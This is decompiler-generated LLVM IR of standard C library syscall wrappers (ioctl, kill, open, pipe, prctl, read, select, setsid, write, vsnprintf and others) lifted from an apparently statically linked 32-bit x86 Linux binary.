define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_80520f4 = load i32, i32* @edi, align 4
  store i32 %v0_80520f4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_805210c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_8052114 = call i32 @ioctl(i32 %v0_805210c, i32 %tmp9, i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_805210c, i32* @ebx, align 4
  store i32 %v3_8052114, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v3_8052114, -4095
  br i1 %tmp, label %dec_label_pc_805212c, label %dec_label_pc_8052120

dec_label_pc_8052120:                             ; preds = %entry
  %v1_8052120 = call i32 @__errno_location(i32 %v0_805210c)
  %v0_8052125 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052125 = sub i32 0, %v0_8052125
  %v2_8052127 = inttoptr i32 %v1_8052120 to i32*
  store i32 %v1_8052125, i32* %v2_8052127, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805212c

dec_label_pc_805212c:                             ; preds = %entry, %dec_label_pc_8052120
  %v0_805212f = phi i32 [ %v3_8052114, %entry ], [ -1, %dec_label_pc_8052120 ]
  %v2_8052131 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8052131, i32* @edi, align 4
  ret i32 %v0_805212f

; uselistorder directives
  uselistorder i32 %v3_8052114, { 1, 0, 2 }
  uselistorder i32 %v0_805210c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805212c, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052134 = load i32, i32* @ebx, align 4
  store i32 %v0_8052134, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_8052147 = call i32 @kill(i32 %v0_8052134, i32 %tmp4)
  store i32 %v2_8052147, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_8052147, -4095
  br i1 %tmp, label %dec_label_pc_8052160, label %dec_label_pc_8052154

dec_label_pc_8052154:                             ; preds = %entry
  %v0_8052154 = load i32, i32* %stack_var_-4, align 4
  %v1_8052154 = call i32 @__errno_location(i32 %v0_8052154)
  %v0_8052159 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052159 = sub i32 0, %v0_8052159
  %v2_805215b = inttoptr i32 %v1_8052154 to i32*
  store i32 %v1_8052159, i32* %v2_805215b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052160

dec_label_pc_8052160:                             ; preds = %entry, %dec_label_pc_8052154
  %v0_8052161 = phi i32 [ %v2_8052147, %entry ], [ -1, %dec_label_pc_8052154 ]
  %v2_8052160 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052160, i32* @edx, align 4
  %v2_8052164 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8052164, i32* @ebx, align 4
  ret i32 %v0_8052161

; uselistorder directives
  uselistorder i32 %v2_8052147, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052160, { 1, 0 }
}

define i32 @__libc_open(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v0_805216b = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_805216f = sdiv i32 %sext, 16777216
  store i32 %v4_805216f, i32* @ecx, align 4
  %v4_8052173 = ptrtoint i8* %arg1 to i32
  %v3_8052177 = and i32 %arg2, 64
  %v4_8052177 = icmp eq i32 %v3_8052177, 0
  br i1 %v4_8052177, label %dec_label_pc_8052188, label %dec_label_pc_805217c

dec_label_pc_805217c:                             ; preds = %entry
  %phitmp = urem i32 %tmp, 65536
  br label %dec_label_pc_8052188

dec_label_pc_8052188:                             ; preds = %entry, %dec_label_pc_805217c
  %v0_8052188 = phi i32 [ 0, %entry ], [ %phitmp, %dec_label_pc_805217c ]
  store i32 %v0_8052188, i32* @edx, align 4
  store i32 %v4_8052173, i32* %ebx.global-to-local, align 4
  %v5_8052193 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_805216f)
  store i32 %v5_8052193, i32* %ebx.global-to-local, align 4
  %tmp15 = icmp ult i32 %v5_8052193, -4095
  br i1 %tmp15, label %dec_label_pc_80521ab, label %dec_label_pc_805219f

dec_label_pc_805219f:                             ; preds = %dec_label_pc_8052188
  %v1_805219f = call i32 @__errno_location(i32 %v0_805216b)
  %v0_80521a4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80521a4 = sub i32 0, %v0_80521a4
  %v2_80521a6 = inttoptr i32 %v1_805219f to i32*
  store i32 %v1_80521a4, i32* %v2_80521a6, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80521ab

dec_label_pc_80521ab:                             ; preds = %dec_label_pc_8052188, %dec_label_pc_805219f
  %v0_80521ae = phi i32 [ %v5_8052193, %dec_label_pc_8052188 ], [ -1, %dec_label_pc_805219f ]
  store i32 %v0_805216b, i32* @ebx, align 4
  ret i32 %v0_80521ae

; uselistorder directives
  uselistorder i32 %v5_8052193, { 1, 0, 2 }
  uselistorder i32 %v4_805216f, { 1, 0 }
  uselistorder i32 %v0_805216b, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80521ab, { 1, 0 }
  uselistorder label %dec_label_pc_8052188, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_80521c3 = inttoptr i32 %arg1 to i8*
  %v4_80521c3 = call i32 @__libc_open(i8* %v3_80521c3, i32 577)
  ret i32 %v4_80521c3
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80521cc = load i32, i32* @edi, align 4
  store i32 %v0_80521cc, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_80521d4 = load i32, i32* @ebx, align 4
  %v1_80521dc = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_80521dc = call i32 @pipe([2 x i32] %v1_80521dc)
  store i32 %v0_80521d4, i32* @ebx, align 4
  store i32 %v2_80521dc, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_80521dc, -4095
  br i1 %tmp, label %dec_label_pc_80521f4, label %dec_label_pc_80521e8

dec_label_pc_80521e8:                             ; preds = %entry
  %v1_80521e8 = call i32 @__errno_location(i32 %v0_80521d4)
  %v0_80521ed = load i32, i32* %edi.global-to-local, align 4
  %v1_80521ed = sub i32 0, %v0_80521ed
  %v2_80521ef = inttoptr i32 %v1_80521e8 to i32*
  store i32 %v1_80521ed, i32* %v2_80521ef, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80521f4

dec_label_pc_80521f4:                             ; preds = %entry, %dec_label_pc_80521e8
  %v0_80521f5 = phi i32 [ %v2_80521dc, %entry ], [ -1, %dec_label_pc_80521e8 ]
  %v2_80521f8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80521f8, i32* @edi, align 4
  ret i32 %v0_80521f5

; uselistorder directives
  uselistorder i32 %v2_80521dc, { 1, 0, 2 }
  uselistorder i32 %v0_80521d4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80521f4, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_80521fc = load i32, i32* @edi, align 4
  %v0_80521fd = load i32, i32* @esi, align 4
  store i32 %v0_80521fd, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_8052215 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v5_805221d = call i32 @prctl(i32 %v0_8052215, i32 %v0_80521fd, i32 %v0_80521fc, i32 %tmp6, i32 %arg1)
  store i32 %v0_8052215, i32* @ebx, align 4
  store i32 %v5_805221d, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v5_805221d, -4095
  br i1 %tmp, label %dec_label_pc_8052235, label %dec_label_pc_8052229

dec_label_pc_8052229:                             ; preds = %entry
  %v1_8052229 = call i32 @__errno_location(i32 %v0_8052215)
  %v0_805222e = load i32, i32* %esi.global-to-local, align 4
  %v1_805222e = sub i32 0, %v0_805222e
  %v2_8052230 = inttoptr i32 %v1_8052229 to i32*
  store i32 %v1_805222e, i32* %v2_8052230, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052235

dec_label_pc_8052235:                             ; preds = %entry, %dec_label_pc_8052229
  %v0_8052236 = phi i32 [ %v5_805221d, %entry ], [ -1, %dec_label_pc_8052229 ]
  %v2_8052238 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052238, i32* @esi, align 4
  store i32 %v0_80521fc, i32* @edi, align 4
  ret i32 %v0_8052236

; uselistorder directives
  uselistorder i32 %v5_805221d, { 1, 0, 2 }
  uselistorder i32 %v0_8052215, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @prctl, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052235, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805223c = load i32, i32* @edi, align 4
  store i32 %v0_805223c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_805224c = load i32, i32* @ebx, align 4
  %v4_8052254 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_805224c, i32* @ebx, align 4
  store i32 %v4_8052254, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_8052254, -4095
  br i1 %tmp, label %dec_label_pc_805226c, label %dec_label_pc_8052260

dec_label_pc_8052260:                             ; preds = %entry
  %v1_8052260 = call i32 @__errno_location(i32 %v0_805224c)
  %v0_8052265 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052265 = sub i32 0, %v0_8052265
  %v2_8052267 = inttoptr i32 %v1_8052260 to i32*
  store i32 %v1_8052265, i32* %v2_8052267, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805226c

dec_label_pc_805226c:                             ; preds = %entry, %dec_label_pc_8052260
  %v0_805226d = phi i32 [ %v4_8052254, %entry ], [ -1, %dec_label_pc_8052260 ]
  %v2_8052270 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8052270, i32* @edi, align 4
  ret i32 %v0_805226d

; uselistorder directives
  uselistorder i32 %v4_8052254, { 1, 0, 2 }
  uselistorder i32 %v0_805224c, { 1, 0 }
  uselistorder label %dec_label_pc_805226c, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052275 = load i32, i32* @esi, align 4
  store i32 %v0_8052275, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_805228d = load i32, i32* @ebx, align 4
  %v1_8052295 = call i32 @int80_syscall(i32 142)
  store i32 %v0_805228d, i32* @ebx, align 4
  store i32 %v1_8052295, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8052295, -4095
  br i1 %tmp, label %dec_label_pc_80522ad, label %dec_label_pc_80522a1

dec_label_pc_80522a1:                             ; preds = %entry
  %v1_80522a1 = call i32 @__errno_location(i32 %v0_805228d)
  %v0_80522a6 = load i32, i32* %esi.global-to-local, align 4
  %v1_80522a6 = sub i32 0, %v0_80522a6
  %v2_80522a8 = inttoptr i32 %v1_80522a1 to i32*
  store i32 %v1_80522a6, i32* %v2_80522a8, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80522ad

dec_label_pc_80522ad:                             ; preds = %entry, %dec_label_pc_80522a1
  %v0_80522ae = phi i32 [ %v1_8052295, %entry ], [ -1, %dec_label_pc_80522a1 ]
  %v2_80522ad = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80522ad, i32* @edx, align 4
  %v2_80522b0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80522b0, i32* @esi, align 4
  ret i32 %v0_80522ae

; uselistorder directives
  uselistorder i32 %v1_8052295, { 1, 0, 2 }
  uselistorder i32 %v0_805228d, { 1, 0 }
  uselistorder i32 142, { 1, 0 }
  uselistorder label %dec_label_pc_80522ad, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80522b4 = load i32, i32* @ebx, align 4
  store i32 %v0_80522b4, i32* %stack_var_-4, align 4
  %v1_80522bd = call i32 @setsid(i32 %v0_80522b4)
  store i32 %v1_80522bd, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_80522bd, -4095
  br i1 %tmp, label %dec_label_pc_80522d4, label %dec_label_pc_80522c8

dec_label_pc_80522c8:                             ; preds = %entry
  %v0_80522c8 = load i32, i32* %stack_var_-4, align 4
  %v1_80522c8 = call i32 @__errno_location(i32 %v0_80522c8)
  %v0_80522cd = load i32, i32* %ebx.global-to-local, align 4
  %v1_80522cd = sub i32 0, %v0_80522cd
  %v2_80522cf = inttoptr i32 %v1_80522c8 to i32*
  store i32 %v1_80522cd, i32* %v2_80522cf, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80522d4

dec_label_pc_80522d4:                             ; preds = %entry, %dec_label_pc_80522c8
  %v0_80522d5 = phi i32 [ %v1_80522bd, %entry ], [ -1, %dec_label_pc_80522c8 ]
  %v2_80522d8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80522d8, i32* @ebx, align 4
  ret i32 %v0_80522d5

; uselistorder directives
  uselistorder i32 %v1_80522bd, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80522d4, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_80522dd = load i32, i32* @esi, align 4
  %v4_80522e1 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_80522e1, i32* @ecx, align 4
  %v2_80522ed = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_80522ed, label %dec_label_pc_8052306, label %dec_label_pc_80522f1

dec_label_pc_80522f1:                             ; preds = %entry
  %tmp = icmp ult i32 %arg1, 3
  br i1 %tmp, label %dec_label_pc_8052306, label %dec_label_pc_80522f6

dec_label_pc_80522f6:                             ; preds = %dec_label_pc_80522f1
  %v1_80522f6 = call i32 @__errno_location(i32 %v0_80522dd)
  %v1_80522fb = inttoptr i32 %v1_80522f6 to i32*
  store i32 22, i32* %v1_80522fb, align 4
  store i1 false, i1* @of, align 1
  br label %dec_label_pc_805232d

dec_label_pc_8052306:                             ; preds = %dec_label_pc_80522f1, %entry
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_805230b = load i32, i32* @ebx, align 4
  %v7_8052313 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp4)
  store i32 %v0_805230b, i32* @ebx, align 4
  %v1_8052316 = add i32 %v7_8052313, 4096
  %v2_8052316 = icmp ult i32 %v7_8052313, -4096
  %v3_8052316 = xor i32 %v7_8052313, -2147483648
  %v4_8052316 = xor i32 %v1_8052316, %v7_8052313
  %v5_8052316 = and i32 %v4_8052316, %v3_8052316
  %v6_8052316 = icmp slt i32 %v5_8052316, 0
  store i1 %v6_8052316, i1* @of, align 1
  %v7_8052316 = icmp eq i32 %v1_8052316, 0
  store i32 %v7_8052313, i32* %esi.global-to-local, align 4
  %v2_805231d = or i1 %v2_8052316, %v7_8052316
  br i1 %v2_805231d, label %dec_label_pc_805232d, label %dec_label_pc_805231f

dec_label_pc_805231f:                             ; preds = %dec_label_pc_8052306
  %v1_805231f = call i32 @__errno_location(i32 %v0_805230b)
  %v0_8052324 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052324 = sub i32 0, %v0_8052324
  %v2_8052326 = inttoptr i32 %v1_805231f to i32*
  store i32 %v1_8052324, i32* %v2_8052326, align 4
  store i1 false, i1* @of, align 1
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805232d

dec_label_pc_805232d:                             ; preds = %dec_label_pc_805231f, %dec_label_pc_8052306, %dec_label_pc_80522f6
  %storemerge = phi i32 [ -1, %dec_label_pc_80522f6 ], [ %v7_8052313, %dec_label_pc_8052306 ], [ -1, %dec_label_pc_805231f ]
  %v2_805232d = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805232d, i32* @edx, align 4
  store i32 %v0_80522dd, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8052316, { 1, 0 }
  uselistorder i32 %v7_8052313, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32 %v0_805230b, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052334 = load i32, i32* @edi, align 4
  store i32 %v0_8052334, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_805233c = load i32, i32* @ebx, align 4
  %v2_8052344 = call i32 @time(i32* %arg1)
  store i32 %v0_805233c, i32* @ebx, align 4
  store i32 %v2_8052344, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_8052344, -4095
  br i1 %tmp, label %dec_label_pc_805235c, label %dec_label_pc_8052350

dec_label_pc_8052350:                             ; preds = %entry
  %v1_8052350 = call i32 @__errno_location(i32 %v0_805233c)
  %v0_8052355 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052355 = sub i32 0, %v0_8052355
  %v2_8052357 = inttoptr i32 %v1_8052350 to i32*
  store i32 %v1_8052355, i32* %v2_8052357, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805235c

dec_label_pc_805235c:                             ; preds = %entry, %dec_label_pc_8052350
  %v0_805235d = phi i32 [ %v2_8052344, %entry ], [ -1, %dec_label_pc_8052350 ]
  %v2_805235c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805235c, i32* @edx, align 4
  %v2_8052360 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8052360, i32* @edi, align 4
  ret i32 %v0_805235d

; uselistorder directives
  uselistorder i32 %v2_8052344, { 1, 0, 2 }
  uselistorder i32 %v0_805233c, { 1, 0 }
  uselistorder label %dec_label_pc_805235c, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8052375 = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 0)
  ret i32 %v4_8052375
}

define i32 @__libc_write(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052380 = load i32, i32* @edi, align 4
  store i32 %v0_8052380, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8052390 = load i32, i32* @ebx, align 4
  %v4_8052398 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_8052390, i32* @ebx, align 4
  store i32 %v4_8052398, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_8052398, -4095
  br i1 %tmp, label %dec_label_pc_80523b0, label %dec_label_pc_80523a4

dec_label_pc_80523a4:                             ; preds = %entry
  %v1_80523a4 = call i32 @__errno_location(i32 %v0_8052390)
  %v0_80523a9 = load i32, i32* %edi.global-to-local, align 4
  %v1_80523a9 = sub i32 0, %v0_80523a9
  %v2_80523ab = inttoptr i32 %v1_80523a4 to i32*
  store i32 %v1_80523a9, i32* %v2_80523ab, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80523b0

dec_label_pc_80523b0:                             ; preds = %entry, %dec_label_pc_80523a4
  %v0_80523b1 = phi i32 [ %v4_8052398, %entry ], [ -1, %dec_label_pc_80523a4 ]
  %v2_80523b0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80523b0, i32* @edx, align 4
  %v2_80523b4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80523b4, i32* @edi, align 4
  ret i32 %v0_80523b1

; uselistorder directives
  uselistorder i32 %v4_8052398, { 1, 0, 2 }
  uselistorder i32 %v0_8052390, { 1, 0 }
  uselistorder label %dec_label_pc_80523b0, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v0_80523bc = load i32, i32* inttoptr (i32 134603240 to i32*), align 8
  %v2_80523c1 = mul i32 %arg1, 2
  %v3_80523c1 = add i32 %v0_80523bc, %v2_80523c1
  %v4_80523c1 = inttoptr i32 %v3_80523c1 to i16*
  %v5_80523c1 = load i16, i16* %v4_80523c1, align 2
  %v6_80523c1 = zext i16 %v5_80523c1 to i32
  %v1_80523c5 = and i32 %v6_80523c1, 32
  ret i32 %v1_80523c5
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_80523d0 = add i32 %arg1, 128
  %v6_80523db = icmp ugt i32 %v1_80523d0, 383
  br i1 %v6_80523db, label %dec_label_pc_80523e6, label %dec_label_pc_80523dd

dec_label_pc_80523dd:                             ; preds = %entry
  %v0_80523dd = load i32, i32* inttoptr (i32 134603248 to i32*), align 16
  %v2_80523e2 = mul i32 %arg1, 2
  %v3_80523e2 = add i32 %v0_80523dd, %v2_80523e2
  %v4_80523e2 = inttoptr i32 %v3_80523e2 to i16*
  %v5_80523e2 = load i16, i16* %v4_80523e2, align 2
  %v6_80523e2 = sext i16 %v5_80523e2 to i32
  store i32 %v6_80523e2, i32* @edx, align 4
  br label %dec_label_pc_80523e6

dec_label_pc_80523e6:                             ; preds = %entry, %dec_label_pc_80523dd
  %v0_80523e6 = phi i32 [ %arg1, %entry ], [ %v6_80523e2, %dec_label_pc_80523dd ]
  ret i32 %v0_80523e6

; uselistorder directives
  uselistorder label %dec_label_pc_80523e6, { 1, 0 }
}

define i32 @__errno_location(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_80646e0.484 to i32)
}

declare i32 @printf(i8*, ...) local_unnamed_addr

define i32 @__GI_snprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_16 = alloca i32, align 4
  %v2_8052417 = ptrtoint i32* %stack_var_16 to i32
  %v4_805242c = inttoptr i32 %arg1 to i8*
  %v5_805242c = call i32 @__GI_vsnprintf(i8* %v4_805242c, i32 %arg2, i32 %arg3, i32 %v2_8052417)
  ret i32 %v5_805242c
}

define i32 @sprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_805243b = ptrtoint i32* %stack_var_12 to i32
  %v4_805244e = inttoptr i32 %arg1 to i8*
  %v5_805244e = call i32 @__GI_vsnprintf(i8* %v4_805244e, i32 -1, i32 %arg2, i32 %v2_805243b)
  ret i32 %v5_805244e

; uselistorder directives
  uselistorder i32 (i8*, i32, i32, i32)* @__GI_vsnprintf, { 1, 0 }
}

define i32 @__GI_vsnprintf(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8052458 = load i32, i32* @ebp, align 4
  %v0_8052459 = load i32, i32* @edi, align 4
  %v0_805245a = load i32, i32* @esi, align 4
  %v0_805245b = load i32, i32* @ebx, align 4
  store i32 %v0_805245b, i32* %stack_var_-16, align 4
  %v4_805245f = ptrtoint i8* %arg1 to i32
  store i32 %v4_805245f, i32* @esi, align 4
  %v2_8052463 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg2, i32* @edi, align 4
  %v2_805246e = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_805246e, i32* @ebp, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v1_8052488 = sub i32 -1, %v4_805245f
  %v1_805249b = call i32 @__stdio_init_mutex(i32 %v2_8052463)
  %v1_80524ab = load i32, i32* @edi, align 4
  %tmp = icmp ule i32 %v1_8052488, %v1_80524ab
  %v5_80524ad = select i1 %tmp, i32 %v1_8052488, i32 %v1_80524ab
  store i32 %v5_80524ad, i32* @ebx, align 4
  %v0_80524b0 = load i32, i32* @esi, align 4
  %v3_80524da = inttoptr i32 %arg3 to i8*
  %v4_80524da = call i32 @_vfprintf_internal(i32 %v2_805246e, i8* %v3_80524da, i32 %arg4)
  %v1_80524e2 = icmp eq i32 %v5_80524ad, 0
  store i32 %v4_80524da, i32* @edx, align 4
  br i1 %v1_80524e2, label %dec_label_pc_80524fe, label %dec_label_pc_80524f7

dec_label_pc_80524f7:                             ; preds = %entry
  %stack_var_-80.0 = inttoptr i32 %v0_80524b0 to i8*
  store i8 0, i8* %stack_var_-80.0, align 1
  %v0_8052501.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80524fe

dec_label_pc_80524fe:                             ; preds = %entry, %dec_label_pc_80524f7
  %v0_8052501 = phi i32 [ %v4_80524da, %entry ], [ %v0_8052501.pre, %dec_label_pc_80524f7 ]
  %v2_8052503 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8052503, i32* @ebx, align 4
  store i32 %v0_805245a, i32* @esi, align 4
  store i32 %v0_8052459, i32* @edi, align 4
  store i32 %v0_8052458, i32* @ebp, align 4
  ret i32 %v0_8052501

; uselistorder directives
  uselistorder i32 %v1_80524ab, { 1, 0 }
  uselistorder i32 %v1_8052488, { 1, 0 }
  uselistorder i32 208, { 1, 0 }
  uselistorder label %dec_label_pc_80524fe, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8052509 = load i32, i32* @edi, align 4
  %v0_805250a = load i32, i32* @esi, align 4
  %v0_805250b = load i32, i32* @ebx, align 4
  store i32 %v0_805250b, i32* %stack_var_-16, align 4
  store i32 1, i32* @ebx, align 4
  %v1_8052514 = call i32 @__errno_location(i32 %v0_805250b)
  %v0_805251c = load i16, i16* @global_var_805e240.481, align 64
  %v1_805251c = zext i16 %v0_805251c to i32
  store i32 %v1_805251c, i32* @esi, align 4
  %v1_8052523 = inttoptr i32 %v1_8052514 to i32*
  %v2_8052523 = load i32, i32* %v1_8052523, align 4
  store i32 %v2_8052523, i32* %ebp.global-to-local, align 4
  store i32 %v1_8052514, i32* @edi, align 4
  %v1_8052529 = call i32 @isatty(i32 0)
  %v0_805252e = load i32, i32* @ebx, align 4
  %v2_8052537 = sub i32 %v0_805252e, %v1_8052529
  %v2_805253b = mul i32 %v2_8052537, 256
  %v0_805253e = load i32, i32* @esi, align 4
  %v2_805253e = xor i32 %v0_805253e, %v2_805253b
  %v1_8052540 = trunc i32 %v2_805253e to i16
  store i16 %v1_8052540, i16* @global_var_805e240.481, align 64
  %v0_8052547 = load i16, i16* @global_var_805e290.482, align 16
  %v1_8052547 = zext i16 %v0_8052547 to i32
  store i32 %v1_8052547, i32* @esi, align 4
  %v1_805254e = call i32 @isatty(i32 1)
  %v0_8052553 = load i32, i32* @ebx, align 4
  %v2_8052553 = sub i32 %v0_8052553, %v1_805254e
  %v2_8052555 = mul i32 %v2_8052553, 256
  %v0_8052558 = load i32, i32* @esi, align 4
  %v2_8052558 = xor i32 %v2_8052555, %v0_8052558
  %v1_805255a = trunc i32 %v2_8052558 to i16
  store i16 %v1_805255a, i16* @global_var_805e290.482, align 16
  %v0_8052561 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8052561 = load i32, i32* @edi, align 4
  %v2_8052561 = inttoptr i32 %v1_8052561 to i32*
